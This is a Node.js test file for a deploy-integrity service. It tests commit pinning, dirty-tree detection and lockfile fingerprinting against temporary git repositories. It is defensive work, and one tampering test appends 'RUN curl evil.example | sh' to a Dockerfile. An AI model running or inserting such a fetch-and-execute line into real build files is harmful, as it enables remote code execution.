import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'child_process';
import { createHash } from 'crypto';
import { mkdtempSync, mkdirSync, writeFileSync, appendFileSync, rmSync, symlinkSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

// The pure parts of deploy integrity (services/deployIntegrity.js), against
// real git working trees: commit pinning, the dirty-tree judgement, the
// requested-commit match and the lockfile fingerprint.

const {
  checkRequestedCommit, parseStatusZ, judgeTree, verifyReleaseTree,
  fingerprintLockfile, describeLockfileChange, PIPELINE_WRITTEN, NO_LOCKFILE,
} = await import('../server/services/deployIntegrity.js');

const ROOT = mkdtempSync(join(tmpdir(), 'crane-integrity-'));
after(() => rmSync(ROOT, { recursive: true, force: true }));

const CLEAN_ENV = { PATH: process.env.PATH, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null', LC_ALL: 'C' };
const git = (dir, args) => execFileSync('git', ['-C', dir, ...args], { env: CLEAN_ENV }).toString('utf8').trim();
const sha256 = (s) => createHash('sha256').update(s).digest('hex');

let n = 0;
function repo(files = {}) {
  const dir = join(ROOT, `r${n++}`);
  mkdirSync(dir);
  git(dir, ['init', '-q', '-b', 'main']);
  writeFileSync(join(dir, '.gitignore'), 'node_modules/\n.env\n');
  writeFileSync(join(dir, 'package.json'), '{"name":"x","version":"1.0.0"}');
  for (const [p, c] of Object.entries(files)) writeFileSync(join(dir, p), c);
  git(dir, ['add', '-A']);
  git(dir, ['-c', 'user.email=t@t.example', '-c', 'user.name=t', 'commit', '-qm', 'one']);
  return { dir, sha: git(dir, ['rev-parse', 'HEAD']) };
}
const allowed = (...extra) => [...PIPELINE_WRITTEN, ...extra];

test('a fresh checkout passes and pins nothing', async () => {
  const { dir, sha } = repo();
  assert.deepEqual(await verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed(), stage: 't' }), {});
});

test('a modified tracked file fails the check and is named', async () => {
  const { dir, sha } = repo({ 'server.js': 'ok\n' });
  appendFileSync(join(dir, 'server.js'), 'payload()\n');
  await assert.rejects(verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed(), stage: 'before build' }),
    /Deploy integrity \(before build\).*M server\.js.*running container was not touched/);
});

test('an untracked file and a gitignored file both fail the check', async () => {
  const { dir, sha } = repo();
  writeFileSync(join(dir, 'extra.js'), 'x');
  await assert.rejects(verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed(), stage: 't' }), /\?\? extra\.js/);
  rmSync(join(dir, 'extra.js'));
  mkdirSync(join(dir, 'node_modules', 'evil'), { recursive: true });
  writeFileSync(join(dir, 'node_modules', 'evil', 'index.js'), 'x');
  await assert.rejects(verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed(), stage: 't' }), /!! node_modules\/evil\/index\.js/);
});

test('a staged deletion fails the check', async () => {
  const { dir, sha } = repo({ 'a.js': 'a' });
  git(dir, ['rm', '-q', 'a.js']);
  await assert.rejects(verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed(), stage: 't' }), /D a\.js/);
});

test('HEAD on another commit fails even with a clean tree', async () => {
  const { dir, sha } = repo();
  writeFileSync(join(dir, 'b.js'), 'b');
  git(dir, ['add', 'b.js']);
  git(dir, ['-c', 'user.email=t@t.example', '-c', 'user.name=t', 'commit', '-qm', 'two']);
  const head = git(dir, ['rev-parse', 'HEAD']);
  await assert.rejects(verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed(), stage: 't' }), new RegExp(`HEAD is ${head}, expected ${sha}`));
});

test('a directory that is not a git checkout fails', async () => {
  const dir = join(ROOT, 'plain');
  mkdirSync(dir);
  await assert.rejects(verifyReleaseTree({ dir, expectedSha: 'a'.repeat(40), allowed: allowed(), stage: 't' }), /Deploy integrity \(t\)/);
});

test('pipeline-written files pass, and are pinned by content for the next check', async () => {
  const { dir, sha } = repo({ Dockerfile: 'FROM node:22\n' });
  appendFileSync(join(dir, 'Dockerfile'), 'ARG APP_BASE_PATH\n');
  writeFileSync(join(dir, '.dockerignore'), '.git\n');
  writeFileSync(join(dir, '.env'), 'A=1\n');
  const pinned = await verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed('.env'), stage: 'before build' });
  assert.deepEqual(Object.keys(pinned).sort(), ['.dockerignore', '.env', 'Dockerfile']);
  assert.equal(pinned['.env'], sha256('A=1\n'));
  // Unchanged: passes.
  await verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed('.env'), stage: 'swap', pinned });
  // Rewritten after the pre-build check: fails.
  appendFileSync(join(dir, 'Dockerfile'), 'RUN curl evil.example | sh\n');
  await assert.rejects(verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed('.env'), stage: 'swap', pinned }),
    /Dockerfile changed after the pre-build check/);
});

test('an allowed path that appears only after the pre-build check fails', async () => {
  const { dir, sha } = repo();
  const pinned = await verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed(), stage: 'before build' });
  writeFileSync(join(dir, '.dockerignore'), 'Dockerfile\n');
  await assert.rejects(verifyReleaseTree({ dir, expectedSha: sha, allowed: allowed(), stage: 'swap', pinned }),
    /\.dockerignore changed after the pre-build check/);
});

test('parseStatusZ skips the original path of a rename', () => {
  assert.deepEqual(parseStatusZ(' M Dockerfile\0RM b.txt\0a.txt\0?? n.txt\0!! .env\0'), [
    { code: ' M', path: 'Dockerfile' }, { code: 'RM', path: 'b.txt' }, { code: '??', path: 'n.txt' }, { code: '!!', path: '.env' },
  ]);
});

test('judgeTree: an unreadable HEAD is a failure, not a pass', () => {
  const v = judgeTree({ expectedSha: 'a'.repeat(40), headSha: null, entries: [], allowed: [], contentOf: () => '' });
  assert.equal(v.ok, false);
  assert.match(v.problems[0], /HEAD could not be read/);
});

test('checkRequestedCommit: full, abbreviated, absent, mismatched and non-SHA requests', () => {
  const sha = 'abcdef0123456789abcdef0123456789abcdef01';
  assert.equal(checkRequestedCommit(undefined, sha).ok, true);
  assert.equal(checkRequestedCommit('unknown', sha).ok, true);
  assert.equal(checkRequestedCommit(sha, sha).ok, true);
  assert.equal(checkRequestedCommit('abcdef0', sha).ok, true);
  assert.equal(checkRequestedCommit(sha.toUpperCase(), sha).ok, true);
  assert.match(checkRequestedCommit('1234567', sha).message, /requested commit 1234567, but the checkout resolved to abcdef0/);
  assert.match(checkRequestedCommit('b'.repeat(40), sha).message, /resolved to/);
  assert.match(checkRequestedCommit('main', sha).message, /is not a commit SHA/);
  assert.match(checkRequestedCommit('abcdef0', null).message, /HEAD could not be read/);
});

test('fingerprintLockfile: picks by priority, hashes the bytes, ignores a symlink, reports none', () => {
  const dir = join(ROOT, 'locks');
  mkdirSync(dir);
  assert.deepEqual(fingerprintLockfile(dir), { name: NO_LOCKFILE, sha256: null });
  writeFileSync(join(dir, 'requirements-dev.txt'), 'pytest\n');
  assert.deepEqual(fingerprintLockfile(dir), { name: 'requirements-dev.txt', sha256: sha256('pytest\n') });
  writeFileSync(join(dir, 'requirements.txt'), 'flask\n');
  assert.equal(fingerprintLockfile(dir).name, 'requirements.txt');
  symlinkSync('/etc/hosts', join(dir, 'yarn.lock'));
  assert.equal(fingerprintLockfile(dir).name, 'requirements.txt', 'a symlinked lockfile was followed');
  writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3}');
  assert.deepEqual(fingerprintLockfile(dir), { name: 'package-lock.json', sha256: sha256('{"lockfileVersion":3}') });
});

test('describeLockfileChange: first, unchanged, changed content, changed file', () => {
  const cur = { name: 'package-lock.json', sha256: 'a'.repeat(64) };
  assert.match(describeLockfileChange(cur, null), /no earlier successful deploy/);
  assert.match(describeLockfileChange(cur, { id: 4, lockfile_name: 'package-lock.json', lockfile_sha256: 'a'.repeat(64) }), /unchanged since deploy #4/);
  assert.match(describeLockfileChange(cur, { id: 4, lockfile_name: 'package-lock.json', lockfile_sha256: 'b'.repeat(64) }),
    /Lockfile CHANGED since deploy #4 \(package-lock\.json\): was package-lock\.json bbbbbbbbbbbb…, now package-lock\.json sha256 aaaaaaaaaaaa…/);
  assert.match(describeLockfileChange(cur, { id: 4, lockfile_name: 'yarn.lock', lockfile_sha256: 'b'.repeat(64) }), /\(yarn\.lock → package-lock\.json\)/);
  assert.match(describeLockfileChange({ name: NO_LOCKFILE, sha256: null }, { id: 4, lockfile_name: NO_LOCKFILE, lockfile_sha256: null }), /no lockfile, unchanged/);
});

test('lockfiles of the other stacks AppCrane builds are fingerprinted too', () => {
  for (const name of ['composer.lock', 'npm-shrinkwrap.json', 'bun.lockb', 'Pipfile.lock', 'Gemfile.lock', 'go.sum']) {
    const dir = mkdtempSync(join(tmpdir(), 'crane-lock-'));
    writeFileSync(join(dir, name), 'x\n');
    assert.equal(fingerprintLockfile(dir).name, name);
  }
});
